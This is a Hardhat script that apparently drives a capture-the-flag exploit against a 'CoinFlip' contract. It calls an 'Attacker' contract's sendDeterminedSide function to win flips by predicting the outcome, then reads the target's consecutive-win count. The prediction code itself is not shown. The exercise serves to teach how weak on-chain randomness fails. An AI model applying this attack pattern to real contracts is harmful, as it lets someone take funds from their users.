import { ethers } from "hardhat";
const CONTRACT_ADDRESS = "0xd5aCD6fc77F520c6EA3442C0A9390A9d61A19B43";
// const ATTACKER_ADDRESS = //This is the instance address
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACK_CONTRACT_ADDRESS = "0xfEdda6cE6205A2CA6c58fB9FB1478738D8D1920C";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const contract = await ethers.getContractAt(
    "CoinFlip",
    CONTRACT_ADDRESS,
    signer
  );

  const attackContract = await ethers.getContractAt(
    "Attacker",
    ATTACK_CONTRACT_ADDRESS,
    signer
  );

  console.log(
    `make a test flip: `,
    await attackContract.sendDeterminedSide({ gasLimit: 5000000 })
  );

  console.log("the consecutive wins are: ", await contract.consecutiveWins());
  // see if I won the flip
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
